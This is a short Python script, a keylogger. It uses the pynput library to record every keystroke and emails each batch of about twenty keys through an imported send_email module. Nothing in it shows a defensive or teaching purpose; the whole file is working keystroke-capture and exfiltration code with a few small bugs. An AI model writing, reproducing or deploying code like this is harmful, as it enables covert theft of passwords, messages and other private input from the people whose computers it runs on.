import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

def onPress(key):
    print(key,end=" ")
    global keys,count
    keys.append(str(key)+"/n")
    count+=1
    if(count>20):
        count=0
        email(keys)
        
def email(keys):
    msg = ""
    for key in keys:
        k = key.replace("'","")
        
        if key=="Key.space":
            k = " "
        elif key.find("Key")>0:
            k =""
        
        msg+=k
    print(msg)
    send_email.sendEmail(msg)
    
def onRelease(key):
    if key== Key.esc:
        return False
    
with Listener(on_press=onPress,on_release=onRelease) as listener:
    listener.join()
    
    
    
        
        
    